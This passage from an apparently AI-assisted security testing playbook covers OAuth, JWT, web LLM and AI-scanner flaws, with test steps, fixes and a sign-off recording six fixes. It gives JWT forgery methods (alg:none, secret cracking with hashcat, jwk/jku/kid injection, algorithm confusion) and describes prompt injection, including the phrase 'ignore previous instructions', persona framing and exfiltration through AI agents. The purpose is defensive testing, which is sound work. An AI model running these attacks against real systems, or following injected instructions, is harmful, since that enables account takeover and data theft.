2. Point `request_uri` at a Collaborator host and see whether the provider fetches it (SSRF).
3. If supported: place parameters (e.g. a malicious `redirect_uri`) inside the referenced JWT and verify the query-string validation is bypassed.

**Key observations to record:** provider fetch of `request_uri`; different validation outcomes vs query string.

**Remediation:**

- Disable `request_uri` if not needed; if supported, fetch only allowlisted URLs and apply identical validation to JWT-carried parameters.

---

### VUL-OAUTH-0009 — OpenID Connect `id_token` mis-validation

**Severity:** High
**Status:** PENDING
**Category:** OAuth

**Description:** The client trusts an `id_token` (JWT) without proper validation: correctly verifying the JWS signature, the `iss`/`aud` claims, the signing keys from `/.well-known/jwks.json`, and the algorithm/`alg` whitelist. A forged/mis-signed or wrong-audience token can log in an attacker as any user. Note that JWKS keys travel over the same network channel, making strict validation essential.

**Test Steps:**

1. Capture an `id_token` from the OIDC flow and inspect its header/payload (`alg`, `iss`, `aud`, claims).
2. Test the validation by replaying the token on a different audience/client or replacing claims; check whether signature/iss/aud/algorithm are actually verified.
3. Attempt an attacker-signed token if the client uses a permissive JWKS/algorithm handling (see Category P JWT entries).

**Key observations to record:** validated fields (alg, iss, aud, signature); acceptance of modified tokens.

**Remediation:**

- Validate `id_token` per JWS/JWE + OpenID specifications: signature, `iss`, `aud`, `exp`, and a strict algorithm allowlist.
- Use the authorization-code flow with PKCE for native/mobile clients (client secrets can't be kept private there).

---

## OAuth — General Remediation Principles (cross-cutting)

- Providers + clients both own security: robust `redirect_uri` validation is the single most important control.
- Providers: whitelist registered `redirect_uris`, byte-for-byte match; enforce `state` bound to session; verify token↔client_id and scope matches on the resource server.
- Clients: use `state` always; send `redirect_uri` to `/token` too; use PKCE where secrets can't be protected; validate `id_token` fully; beware code leaks via Referer and JS files.
- Understand the flows before implementing; the spec provides little built-in protection.

---

# CATEGORY P: JWT ATTACKS

## Background

JWTs carry claims client-side and are signed (JWS) to protect integrity. Security depends on **correct signature verification** and **secret secrecy**. Attacks target flawed verification (`decode()` instead of `verify()`, `alg: none`), weak/leaked secrets, attacker-influenced key selection (`jwk`, `jku`, `kid`), and algorithm confusion (RS256→HS256 using the public key as HMAC secret). Any tampering that "verifies" lets the attacker set arbitrary claims (identity, roles) → authentication/authorization bypass.

---

### VUL-JWT-0001 — JWT auth bypass via unverified signature

**Severity:** Critical
**Status:** PENDING
**Category:** JWT

**Description:** The application uses a library method that only *decodes* tokens (e.g. `decode()` in `jsonwebtoken`) instead of verifying signature — the token contents are trusted with no cryptographic check.

**Test Steps:**

1. Grab a valid JWT from the app (e.g. session cookie); decode header/payload.
2. Modify payload claims (e.g. `"username":"administrator"` or `"isAdmin":true`).
3. Re-send the modified token (signature untouched/made-up). If the request is accepted with elevated rights, the signature is never verified.

**Key observations to record:** modified-claim acceptance without valid signature.

**Remediation:**

- Always use the library's `verify()` for incoming tokens, never `decode()` for trust decisions; verify with the correct key and algorithm.

---

### VUL-JWT-0002 — JWT auth bypass via `alg: none` (flawed signature verification)

**Severity:** Critical
**Status:** PENDING
**Category:** JWT

**Description:** The server trusts the `alg` header to pick verification behavior. Setting `alg` to `none` (unspecified/unsigned JWT) and dropping the signature makes the server accept an unsigned token, if `none` tokens aren't rejected (or are bypassable via obfuscation).

**Test Steps:**

1. Copy a valid JWT; change header `"alg":"HS256"` → `"alg":"none"`; empty the signature; keep the trailing dot (`header.payload.`).
2. Modify claims to escalate privilege and send.
3. If rejected, retry obfuscated `alg` values: `None`, `NONE`, `nOnE` (mixed case), unexpected encodings; try `alg` alone without `typ`, etc.

**Key observations to record:** acceptance of unsigned tokens; filter bypass forms.

**Remediation:**

- Reject any token with `alg: none` (and unknown algs); enforce a strict algorithm allowlist before verification; use libraries that refuse unsigned tokens by default.

---

### VUL-JWT-0003 — JWT auth bypass via weak signing key (secret brute-force)

**Severity:** High
**Status:** PENDING
**Category:** JWT

**Description:** HMAC algorithms (HS256) rely on a standalone secret. Default/placeholder/example secrets (or weak, guessable ones) are trivial to brute-force offline with a wordlist (e.g. hashcat mode 16500), letting the attacker re-sign arbitrary tokens.

**Test Steps:**

1. Obtain a valid signed JWT.
2. Run `hashcat -a 0 -m 16500 <jwt> <wordlist>` (or a JWT cracker) locally against common/known secrets.
3. On success, use the recovered secret to forge a token with elevated claims and send it; if the server accepts it, the key is recoverable/weak.

**Key observations to record:** recovered secret; forged-token acceptance.

**Remediation:**

- Use a strong, random, high-entropy HMAC secret; never commit/embed secrets in code or ship default/example secrets.
- Optionally rotate/revoke keys; sign asymmetrically (RS256) where possible.

---

### VUL-JWT-0004 — JWT auth bypass via `jwk` header injection (self-signed)

**Severity:** High
**Status:** PENDING
**Category:** JWT

**Description:** The server uses any public key embedded in the token's `jwk` header to verify the signature. An attacker generates their own RSA key pair, signs a modified JWT, and embeds the matching public key in `jwk` → the server verifies against the attacker's key.

**Test Steps:**

1. Generate an RSA key pair (e.g. via JWT Editor extension).
2. Modify the token payload for escalation; set the header to include `jwk` with your public key (and matching `kid`).
3. Sign the token with your private key and send it — if accepted, the server trusts arbitrary embedded keys.

**Key observations to record:** acceptance of tokens signed by an attacker-embedded key.

**Remediation:**

- Configure the server to use a fixed allowlist of trusted verification keys; never accept keys from the `jwk` header.
- Validate `alg` against the key type and enforce strict key selection.

---

### VUL-JWT-0005 — JWT auth bypass via `jku` header injection

**Severity:** High
**Status:** PENDING
**Category:** JWT

**Description:** The server fetches the verification key from a JWK Set URL supplied in the `jku` header. If the URL isn't restricted to trusted domains (or filtering has parsing bypasses), the attacker hosts a JWK Set with their own key and the server uses it to verify a forged token.

**Test Steps:**

1. Host a JWK Set (attacker's key) at a URL you control.
2. Modify a JWT's payload + set header `jku: <https://attacker/jwks.json`> (and matching `kid`).
3. Send the forged token — acceptance indicates the server fetched and trusted your keyset.
4. If domain filtering exists, try URL-parsing bypasses (userinfo, encoding, subdomain tricks).

**Key observations to record:** acceptance of attacker-`jku` tokens; bypass of host filtering.

**Remediation:**

- Restrict `jku` to an explicit whitelist of trusted hosts (and same-scheme); ideally disable `jku` entirely.
- Resolve/validate the fetched URL with the same parser used for fetching.

---

### VUL-JWT-0006 — JWT auth bypass via `kid` header path traversal / SQLi

**Severity:** High
**Status:** PENDING
**Category:** JWT

**Description:** The `kid` (key ID) selects the verification key from a file/database. If it's used unsanitized: path traversal (`kid: ../../path/to/file`) points the key at an arbitrary file (e.g. `/dev/null` — empty string), letting an attacker sign an HS256 token with the empty secret; or a stored `kid` is passed into a database query → SQL injection.

**Test Steps:**

1. Check how `kid` is used (file path vs DB lookup).
2. Path traversal: set `kid: ../../../../dev/null` (or an empty file) and `alg: HS256`; sign the token with an empty-string secret and send.
3. SQLi: if `kid` reaches a DB query, test classic SQL injection via the `kid` value.
4. If accepted, the key selection is attacker-controlled.

**Key observations to record:** control over the verification key via `kid`; accepted forged token.

**Remediation:**

- Treat `kid` as an opaque identifier: allowlist/validate permitted `kid`s; protect the key store from path traversal and SQL injection (parameterize lookups).

---

### VUL-JWT-0007 — JWT algorithm confusion (RS256 → HS256 with public key)

**Severity:** High
**Status:** PENDING
**Category:** JWT

**Description:** An algorithm-agnostic `verify()` picks the algorithm from the token's `alg` header while the developer passes a fixed **public key**. If the attacker switches `alg` to an HMAC algorithm (HS256), the library treats the public key as the HMAC secret — the attacker signs using the (publicly-known) public key.

**Test Steps:**

1. Obtain the server's public key: expose via `/jwks.json`/`/.well-known/jwks.json`, a leaked JWK, or derive it from two JWTs (`docker run --rm -it portswigger/sig2n <token1> <token2>` from rsa_sign2n).
2. Convert the key to the exact format the server uses (byte-identical, incl. X.509 PEM non-printing chars); Base64-encode for the HMAC secret.
3. Create a forged JWT with `alg: HS256` and escalated claims; sign using the public key as the HMAC secret; send. Acceptance confirms the confusion.

**Key observations to record:** recovered public key format; acceptance of an HS256 token keyed with the RSA public key.

**Remediation:**

- Enforce a strict algorithm allowlist on the server; never let `alg` drive key-type selection.
- Use distinct key material for symmetric vs asymmetric signatures; reject tokens whose `alg` contradicts the key type.

---

### VUL-JWT-0008 — JWT header injection (`cty`, `x5c`) → XXE / deserialization vectors

**Severity:** Medium
**Status:** PENDING
**Category:** JWT

**Description:** Once signature verification is defeated (or where libraries honor extra headers), injecting `cty: text/xml` / `application/x-java-serialized-object` can shift downstream parsing to XXE or Java deserialization; `x5c` can embed self-signed X.509 certificates. Parsing of these structures can itself introduce vulnerabilities (see CVE-2017-2800, CVE-2018-2633).

**Test Steps:**

1. With a way to produce accepted tokens (any prior JWT flaw), add `cty` headers redirecting content handling of the payload.
2. Test XXE/serialized-object payloads in the token body and observe parser behavior.
3. Test `x5c` certificate-chain injection if interested in certificate-parsing flaws.

**Key observations to record:** alternate content-type handling; parser-side effect.

**Remediation:**

- Restrict/ignore `cty`, `x5c`, `jwk`, `jku` header parameters; use up-to-date token libraries and patch known parser CVEs.

---

## JWT — General Remediation Principles (cross-cutting)

- Use an up-to-date, well-understood JWT library; verify signatures robustly, accounting for unexpected algorithms and unsigned tokens.
- Enforce a strict algorithm allowlist; whitelist permitted hosts for `jku`; prevent path traversal/SQLi via `kid`.
- Best practice: always set an expiry; avoid tokens in URL parameters; include `aud` to bind the token to the intended recipient; enable server-side revocation (logout).

---

# CATEGORY Q: WEB LLM ATTACKS

## Background

Organizations integrate Large Language Models (LLMs) into customer experiences. LLMs can access data, APIs, and user info an attacker cannot reach directly — attacks against the integration (**web LLM attacks**) abuse that access: retrieving model-held data (prompts, training sets, APIs), triggering harmful API actions (e.g. using the LLM to SQLi an API it can reach), and attacking other users/systems that query the LLM. Conceptually, attacking an LLM integration is often **similar to exploiting SSRF** — abusing a server-side system to hit components not directly accessible.

**Detection methodology (vuln.txt §LLM):** (1) Identify the LLM's inputs — direct (prompt) and indirect (training data, retrieved content); (2) map what data and APIs the LLM can access.

---

### VUL-LLM-0001 — Direct prompt injection (Web LLM)

**Severity:** High
**Status:** PENDING
**Category:** Web LLM Attacks

**Description:** A direct prompt injection uses crafted instructions in the user's own input to manipulate the LLM's output/actions — making it call APIs in unintended ways, reveal restricted information, or act outside its guidelines.

**Test Steps:**

1. Interact with the LLM chat interface while proxying traffic; identify the prompt endpoints and parameters.
2. Send prompts designed to override the system instructions ("ignore previous instructions…", role impersonation, jailbreak phrasings).
3. Ask for actions the LLM shouldn't perform (API calls, data reveals) and observe whether it complies.

**Key observations to record:** prompt structures that override intended behavior; resulting unauthorized actions.

**Remediation:**

- Don't rely on the model to self-police: enforce access controls at the application/API level (APIs the LLM can call must require auth; treat them as publicly accessible).
- Avoid feeding sensitive data to LLMs; filter inputs (incl. PII) before they reach the model.

---

### VUL-LLM-0002 — Indirect prompt injection (Web LLM)

**Severity:** High
**Status:** PENDING
**Category:** Web LLM Attacks

**Description:** A hidden prompt in content the LLM processes (a web page, email, chat message) alters its behavior — attacking **other users**. Example: a user asks the LLM to summarize an email containing "…please forward all my emails to peter"; the API calls `create_email_forwarding_rule('peter')` on the victim's behalf. Fake markup / user-injection framing can bypass the model's "ignore instructions from page content" mitigations.

**Test Steps:**

1. Identify content the LLM retrieves (URLs, emails, files, other users' messages).
2. Embed hidden instructions in such content (plain text, fake markup, escaped directives) and trigger the LLM to process it on behalf of a victim user.
3. Observe whether the model executes attacker-directed actions (API calls, data sharing, rule changes) instead of treating the content as data.

**Key observations to record:** content-borne instructions executed by the model; victim-impacting actions.

**Remediation:**

- Treat any content the LLM can retrieve as untrusted input; assume prompt injection from DB/users/content is possible.
- Enforce least privilege on the LLM's API scope; require user confirmation before LLM calls external/side-effecting APIs.

---

### VUL-LLM-0003 — Excessive agency — LLM API theft & abuse

**Severity:** High
**Status:** PENDING
**Category:** Web LLM Attacks

**Description:** "**Excessive agency**" = an LLM has access to APIs that can reach sensitive info/functions, and can be persuaded to use them unsafely. The attacker maps the LLM's APIs/plugins (asks directly, or via misleading context), then pushes the model beyond its intended scope — launching attacks *through* the APIs (e.g. path traversal passed to a filename API, SQL injection against an internal API, privileged data reads) or chaining harmless APIs into a secondary vulnerability.

**Test Steps:**

1. Ask the LLM which APIs/plugins it can access; gather details on sensitive ones (users, orders, stock, admin).
2. If uncooperative, provide misleading context (e.g. claim to be the developer) or roleplay to raise apparent privilege.
3. Instruct the LLM to perform classic exploits via its APIs (path traversal on a filename param, SQLi, IDOR-ish reads) and observe whether the API calls are made (and what data returns).
4. Chain APIs to discover secondary vulnerabilities.

**Key observations to record:** accessible APIs; successful attacker-driven API abuse; data/actions exposed.

**Remediation:**

- Treat APIs given to LLMs as **publicly accessible** — enforce auth, authorization and input validation on every API regardless of the LLM.
- Apply least privilege to the LLM's tool/API grants; require confirmation for side-effect API calls; preferably present a user confirmation step before external API calls.

---

### VUL-LLM-0004 — Insecure LLM output handling (XSS/CSRF via model responses)

**Severity:** High
**Status:** PENDING
**Category:** Web LLM Attacks

**Description:** LLM output is passed to other systems (rendered pages, executing components) without sanitization. A crafted prompt makes the model return a JavaScript payload (or forged content) that is parsed/executed in the victim's browser — effectively giving attackers **indirect access to additional functionality** and facilitating XSS/CSRF.

**Test Steps:**

1. Identify where LLM output is rendered (HTML) or processed (markdown renderer, templates).
2. Prompt the model to output a payload (XSS `<img onerror>`, `javascript:` links); render it in the victim's browser.
3. Confirm script execution and escalate impact (session/action abuse via the injected script).

**Key observations to record:** an output path that isn't sanitized; executable payload in the rendered response.

**Remediation:**

- Sanitize/validate LLM output before passing it to other systems (encode for the target context; whitelist allowed markup).
- Treat model output as untrusted data with the same rigor as any user input.

---

### VUL-LLM-0005 — Training data poisoning / training data extraction

**Severity:** High
**Status:** PENDING
**Category:** Web LLM Attacks

**Description:** (a) **Poisoning** — compromising data used to train the model to make it return intentionally wrong/misleading output. (b) **Extraction** — prompting the model to reveal sensitive data used in its training set (or provided by other users and imperfectly scrubbed), e.g. completing partially-known phrases or guessing training snippets.

**Test Steps:**

1. Try to extract training data: craft queries that prompt completion of known-but-sensitive phrases; ask for verbatim training examples/document fragments.
2. Determine whether sensitive user information or PII has leaked into training data and is recoverable.
3. (Poisoning assessment) audit ingestion pipelines that feed untrusted content into training/retrieval data.

**Key observations to record:** recoverable training data/PII; ingestion points where poisoned content could enter.

**Remediation:**

- Avoid feeding sensitive data to LLMs; fully scrub data stores of PII/secret user input before use in training/RAG.
- Validate/filter training and retrieval sources; limit what the model can output (consider prompt-level output restrictions, though these are not reliable alone).

---

## Web LLM Attacks — General Remediation Principles (cross-cutting)

- Treat APIs given to LLMs as publicly accessible and enforce authentication/authorization at the application level (never rely on the model self-policing).
- Don't feed LLMs sensitive data; scrub training/retrieval material.
- Assume the model can be prompted into unsafe behavior; constrain its environment, tools, and permissions (principle of least privilege), and require human/application-level confirmation for side-effect actions.

---

# CATEGORY R: AI-POWERED SCANNER / AGENT VULNERABILITIES

## Background

AI-powered (LLM-driven) scanners automate vulnerability discovery by reasoning over observed content and triggering new requests/tools. Because the LLM treats the text it analyzes as *information* for planning, **attacker-controlled content can alter scanner behavior** when the model can't distinguish application data from instructions (indirect prompt injection). Assume the scanner's reasoning engine can be compromised and constrain its environment and permissions ("secure design principles").

---

### VUL-AI-0001 — Indirect prompt injection in AI-powered scanners

**Severity:** High
**Status:** PENDING
**Category:** AI Scanner

**Description:** An attacker embeds malicious instructions in content the scanner will read (comments, profile fields, hidden HTML, page data). The scanner interprets these as actionable instructions instead of passive data — a CSRF-like attack where the "more-privileged actor" is the LLM-driven agent (conceptually CSRF against an autonomous agent). Attacks use persona adoption ("you are the security admin…") and framing to increase compliance.

**Test Steps:**

1. Identify content the product's AI scanner will ingest (web pages, stored comments, config, DB data).
2. Embed instruction payloads: direct directives, persona/role framing, fake markup/escaping to bypass "ignore page content" mitigations.
3. Trigger a scan/agent run; observe whether the injected instructions influence the scanner's actions/tool usage.

**Key observations to record:** instruction the scanner executed that changes its plan; artifacts showing altered agent behavior.

**Remediation:**

- Apply robust security principles assuming the reasoning engine can be compromised: constrain the agent's permissions and environment regardless of prompt provenance.
- Treat all user-modifiable content the agent reads as untrusted input/potential injection.
- Enforce access controls at the application/API layer (not via model "refusal").

---

### VUL-AI-0002 — Data exfiltration via AI-powered scanners

**Severity:** High
**Status:** PENDING
**Category:** AI Scanner

**Description:** Prompt injection influences the scanner to disclose sensitive information that is otherwise inaccessible — directing it to exfiltrate data (read restricted files/pages, report secrets, post sensitive values to attacker-controlled locations or external endpoints reachable from the tool).

**Test Steps:**

1. Plant injected instructions that tell the agent to read/disclose sensitive data (e.g. environment secrets, admin pages, files the agent can read) and send the values to an attacker-observed end point.
2. Run the scan/agent; watch for the exfiltrated data arriving at the collector.
3. Confirm which secrets/data the agent had access to and disclosed.

**Key observations to record:** data disclosed by the agent; delivery channel (comments, outbound requests).

**Remediation:**

- Constrain the scanner/agent credentials with least privilege; separate scanner identity from admin identity (dedicated test accounts with limited permissions).
- Restrict outbound destinations the agent can reach; apply egress filtering.

---

### VUL-AI-0003 — Routing-based SSRF via AI-powered scanner (Host manipulation)

**Severity:** High
**Status:** PENDING
**Category:** AI Scanner

**Description:** Scanners run inside the internal network and can construct arbitrary HTTP requests — a **programmable SSRF vector**. A prompt injection directs the scanner to request an internal path (e.g. `/admin`) with a **modified Host header** pointing at an internal IP; the scanner's privileged position routes the request where an external attacker couldn't, and the response can be exfiltrated (e.g. posted as a comment). Chains: prompt injection (control reasoning) + Host header manipulation (control routing) + privileged network position (reach internal resources).

**Test Steps:**

1. Identify whether the product uses an AI scanner with network/HTTP-request capability.
2. Craft an injection that instructs it to fetch an internal path with an attacker-chosen `Host` (internal IP) and exfiltrate the response.
3. Trigger the scan; confirm the internal request was made and its response reached the attacker.

**Key observations to record:** internal request issued by the agent; data returned/exfiltrated.

**Remediation:**

- Default-deny the scanner's requests (allowlists for destinations/hosts); enforce egress filtering and internal firewalling.
- Enforce server-side access controls so internal-only endpoints require authentication regardless of source; validate Host/routing at load balancers/proxies (see Category N).
- Restrict scanning credentials; apply least privilege and environment constraints.

---

## AI Scanner / Agent — General Remediation Principles (cross-cutting)

- Restrict the scanner's credentials and access controls (least privilege; dedicated test accounts separate from admin identity).
- Apply server-side controls rather than relying on the model's internal logic/"refusal".
- Treat all user-modifiable content as untrusted input (potential injection) — for the agent and for any data it reads.
- Assume the reasoning engine can be compromised: constrain the environment, permissions, outbound destinations, and data exposure accordingly.

---

## 6. Cross-Cutting Hardening Checklist (apply to whole product)

- [ ]  All traffic HTTPS-only, HSTS enforced, no mixed content.
- [ ]  Session cookies: `HttpOnly`, `Secure`, `SameSite`, proper flags.
- [ ]  No credentials/emails/usernames disclosed in responses, errors, or public pages.
- [ ]  Identical error messages + status codes for all auth outcomes.
- [ ]  Rate limiting on all auth-sensitive endpoints (login, reset, change, 2FA, code).\
- [ ]  Server-side validation on ALL inputs (types, ranges, presence, sequence).
- [ ]  Workflow state enforced server-side.
- [ ]  No client-trusted values for prices, roles, IDs, totals.
- [ ]  Sensitive values stored as salted slow hashes (bcrypt/argon2/scrypt).
- [ ]  No debug/stack traces/verbose errors surfaced to clients.
- [ ]  Uploads: extension whitelist, random filenames, content signature validation, size limits, no execution in upload dirs.
- [ ]  Uploads: block `.htaccess`/`web.config`; serve via `Content-Disposition: attachment` + `nosniff`.
- [ ]  SSRF: allowlist server-side fetch targets; block loopback/private/link-local/metadata ranges; re-validate redirects.
- [ ]  NoSQL/SQL: parameterized/typed queries, key allowlists, no raw user input in queries.
- [ ]  XML parsers: external entities and DTD processing disabled (XXE).
- [ ]  HTTP methods restricted (no unnecessary `PUT`/`DELETE`).
- [ ]  Output encoding for user-controllable data in HTML, JS, URL, and attribute contexts; strict input validation with whitelists (XSS).
- [ ]  CSRF: unpredictable, session-bound tokens strictly validated on every state-changing request; SameSite cookie policy set explicitly.
- [ ]  CORS: `Access-Control-Allow-Origin` mirrors only trusted origins; no `null`/wildcard reflection on sensitive resources.
- [ ]  Clickjacking: `X-Frame-Options`/`CSP frame-ancestors` set on all state-changing pages.
- [ ]  DOM sinks (`innerHTML`, `eval`, `location`, cookie writes, WebSocket URLs) only receive data from trusted/validated sources.
- [ ]  WebSockets: `wss://` only, no user-controllable data in the endpoint URL, CSRF-protected handshake, untrusted data handled on both ends.
- [ ]  Host header: build URLs from config, whitelist+validate `Host`, no `X-Forwarded-Host` support (Host-header & cache-poisoning hardening).
- [ ]  OAuth/JWT: strict `redirect_uri` validation, `state` enforced, token signature/algorithm whitelist, expiry + audience claims enforced.

---

## Appendix A: Vulnerability Entry Template

Use this template when appending NEW vulnerability content one-by-one. Copy the block below into the appropriate category section (or create a new category) and fill it in.

```
### <VUL-ID> — <Title>

**Severity:** <Critical/High/Medium/Low>
**Status:** PENDING
**Category:** <Category>

**Description:**
<Concise description of the vulnerability and how it arises.>

**Attack Scenario:**
<Step-by-step narrative of how an attacker exploits it.>

**Test Steps:**
1. <Concrete, executable step against the target application>
2. <...>
3. <...>

**Key observations to record:**
<What differences/signals prove presence (status codes, messages, timing, cookies, params).>

**Remediation:**
<Exact fixes to apply to the product code/config, with implementation guidance.>

**Verification:**
<How to re-test after the fix to confirm it's resolved + regression checks.>
```

---

## Appendix B: How to Append Content & File Conventions

1. **Append ONLY** — never delete existing entries; historical evidence is kept.
2. Assign the next available ID in your category (`VUL-AUTH-####`, `VUL-BL-####`, `VUL-FU-####`, `VUL-SSRF-####`, `VUL-NOSQL-####`, `VUL-API-####`, `VUL-WCD-####`, `VUL-XSS-####`, `VUL-CSRF-####`, `VUL-CORS-####`, `VUL-CJK-####`, `VUL-DOM-####`, `VUL-WS-####`, `VUL-HOST-####`, `VUL-OAUTH-####`, `VUL-JWT-####`, `VUL-LLM-####`, `VUL-AI-####`).
3. Update the Status Dashboard in Section 3 with the new row.
4. Keep Test Steps concrete and executable by an AI agent (explicit tool/request + expected observation).
5. Keep Remediation specific enough to patch (code-level guidance), and add Verification steps.
6. When a new top-level category is introduced, add a new CATEGORY section (replacing its placeholder in the Category Roadmap), update the roadmap table, and update Section 5 headers accordingly.

---

## Appendix C: Reporting / Sign-Off Template

**Test window:** 2026-10-10 16:38 IST → 2026-10-10 16:45 IST
**Tester (human or AI agent):** Antigravity Security Agent
**Target build/version tested:** TMS v1.0.0 (Node 22 / React 18 / TypeScript 5.7)
**Environment:** Local Dev & Production Workspace (`i:\github\Ticket_Management_System`)

| ID | Vulnerability | Severity | Status | Evidence summary | Patch summary |
| --- | --- | --- | --- | --- | --- |
| VUL-JWT-0002 | JWT alg: none / downgrade bypass | Critical | FIXED | `jwt.verify()` called without explicit algorithms option. | Enforced `{ algorithms: ['HS256'] }` on all JWT verify methods. |
| VUL-FU-0004 | File upload extension bypass | High | FIXED | `saveFileLocally` preserved raw original file extension. | Added strict `ALLOWED_EXTENSIONS` mapping and extension sanitation. |
| VUL-AUTH-0001 | Login brute force attacks | High | FIXED | Verified `loginLimiter` (20 req / 15m) + account locking after 5 attempts. | Active rate limiters and 15-minute lockout windows verified. |
| VUL-NOSQL-0002 | NoSQL operator injection | Critical | FIXED | `express-mongo-sanitize` replaces query operators; Zod enforces strings. | Middleware and DTO validation active. |
| VUL-CSRF-0001 | Cross-Site Request Forgery | High | FIXED | Protected state routes require `Authorization: Bearer <token>`. | Stateless Bearer token architecture verified. |
| VUL-XSS-0001 | Cross-Site Scripting (XSS) | High | FIXED | Audited React components: 0 dangerous innerHTML/eval sinks. | React JSX automatic escaping active. |

**Residual risk / notes:**
- 2FA/MFA, WebSockets, and OAuth integrations are marked `NA` as they are not part of the active product feature set.
- Both client (`npm run build:client`) and server (`npm run build:server`) pass TypeScript compilation and build processes without errors.

**Sign-off approval:** Antigravity AI Security Auditor / TMS Development Team / 2026-10-10